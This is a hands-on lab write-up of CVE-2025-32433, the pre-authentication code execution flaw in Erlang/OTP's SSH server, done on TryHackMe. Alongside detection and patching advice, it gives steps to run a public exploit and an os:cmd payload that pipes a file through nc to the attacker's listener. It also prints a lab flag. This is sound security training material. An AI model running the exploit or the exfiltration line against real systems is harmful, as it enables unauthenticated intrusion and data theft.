# CVE-2025-32433 — Erlang/OTP SSH Pre-Auth RCE

This is a short, hands-on writeup for **CVE-2025-32433**. I tested everything in TryHackMe’s lab environment — AttackBox + target VM — so all testing was done safely in the sandbox.

---

## Overview

Erlang/OTP includes an SSH implementation used by many devices and services. CVE-2025-32433 is a **pre-auth remote code execution** vulnerability in that SSH implementation. The root cause is that the server accepts certain SSH messages reserved for post-authentication (message numbers ≥ 80) during the pre-auth phase. Vulnerable servers process those messages instead of disconnecting, which lets an attacker send crafted messages that execute Erlang code before authentication.

This is critical: you can run code on the target without any credentials. Researchers at Ruhr University Bochum disclosed the issue; PoC code is public.

---

## Affected & Patched Versions

**Affected:**
- OTP-27.3.2 and earlier in that line
- OTP-26.2.5.10 and earlier in that line
- OTP-25.3.2.19 and earlier in that line

**Patched:**
- OTP-27.3.3
- OTP-26.2.5.11
- OTP-25.3.2.20

If you can’t patch immediately, disable the OTP SSH server or restrict access with firewall rules.

---

## Lab environment used

- TryHackMe AttackBox (attacker VM)  
- Target VM with vulnerable Erlang/OTP SSH service  
- Example target IP used in lab: `10.65.143.116`  
- Public PoC repo referenced: `https://github.com/ProDefense/CVE-2025-32433`

---

## Exploit logic — how and why it works

1. SSH protocol defines pre-auth and post-auth message ranges. Messages numbered 80 and up are intended for post-auth only.  
2. A well-behaved server should drop any post-auth messages received before authentication. Vulnerable Erlang/OTP servers do not.  
3. An attacker sends a carefully crafted sequence of SSH messages. The exploit uses legitimate-looking SSH handshake messages followed by an unexpected `SSH_MSG_CHANNEL_REQUEST` or related post-auth message that contains an `exec`-style payload.  
4. Because the server accepts and processes that message during pre-auth, it ends up executing Erlang code embedded in the payload.  
5. The PoC runs in four stages; the final stage delivers Erlang code that executes on the server (e.g., write a file, run os:cmd, etc.).

The key point: this is a protocol-level logic flaw, not an application bug. It bypasses authentication checks by abusing incorrect message handling.

---

## Quick reproduction

1. Start AttackBox and the target VM in TryHackMe.  
2. On the AttackBox, clone the PoC (if internet is available) or copy the exploit script content into a file:

git clone https://github.com/ProDefense/CVE-2025-32433
cd CVE-2025-32433

markdown
Copy code

3. Edit the exploit script to point to the lab target IP and port (e.g., `HOST = "10.65.143.116"`, `PORT = 22`).  
4. Run the PoC:

python3 CVE-2025-32433.py

markdown
Copy code

The PoC’s default payload writes `/lab.txt` with the text `pwned`. You should see output like:

- `[*] Connecting to SSH server...`
- `[+] Received banner: SSH-2.0-Erlang/...`
- `[*] Sending SSH_MSG_KEXINIT...`
- `[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...`
- `[✓] Exploit sent!`

5. Confirm exploitation by changing the payload to exfiltrate `/lab.txt` to your listener:

- Start a listener on AttackBox:

  ```
  nc -lvp 4444
  ```

- Replace the PoC payload with an Erlang command that runs `os:cmd("cat /lab.txt | nc <attackbox_ip> 4444").` (remember the trailing `.` in Erlang statements).  
- Re-run the exploit. The listener should receive `pwned` (or the file contents).

Note: the PoC may print CSRF or request warnings despite successful execution. If the listener receives the exfiltrated data, the exploit worked.

---

## Post-exploit checks

From TryHackMe lab runs, verified results included:

- Lab flag in root: `THM{U57U3P5KnR}`  
- Hostname reported: `c7b79fd068ba`

---

## Detection guidance

**Network-based:**  
- The exploit uses an `SSH_MSG_CHANNEL_REQUEST` sent pre-auth. The packet payload begins with `exec` and contains the command to execute in cleartext.  
- Look for SSH packets with message numbers or payload patterns that should only appear post-auth. IPS/IDS vendors have started releasing signatures (FortiGate, Suricata rules, etc.).

**Host-based:**  
- Watch for unexpected files created after the disclosure date (e.g., `/lab.txt`) and unusual processes started by the SSH/OTP service.  
- Look for outbound connections initiated by the device (e.g., to attacker-controlled IPs) originating from services that normally do not make outbound connections.

**Hunting suggestions:**  
- Monitor for `exec`-style payload strings in SSH traffic captures.  
- Correlate new or changed files on network devices with suspicious SSH session activity.  
- Alert on SSH traffic that deviates from standard pre-auth handshake flows.

---

## Mitigation & recommended actions

- **Patch** to a fixed OTP release as soon as possible.  
- **If immediate patching is impossible:**  
- Disable the Erlang/OTP SSH server if it’s not needed.  
- Restrict SSH access via firewall to trusted management networks only.  
- Deploy network IPS rules detecting pre-auth `exec` payloads and block them.  
- **Long term:** instrument deeper packet inspection for SSH protocol anomalies and ensure devices are on a patch management schedule.

---

## Files to include in the repo folder

- `README.md` — this file   
- `notes.txt` — raw lab outputs and snippets (optional)  
- `screenshots/` — packet captures or evidence images (optional)

---

## Final notes

Protocol-level bugs like this are high-risk because they bypass typical authentication and logging assumptions. If you run systems built on Erlang/OTP (especially network gear or distributed services), prioritize checking for exposed SSH services and patching immediately.
Overall this project was a lot of fun to work with. Below I'll provide a link on the github creators story of the PoC used in these notes. He has a cool story of how it happened. 
https://platformsecurity.com/blog/CVE-2025-32433-poc

This writeup is part of my CVE mini-projects collection. These are short, practical, and focused on clearly showing how the exploit works and how to defend against it.
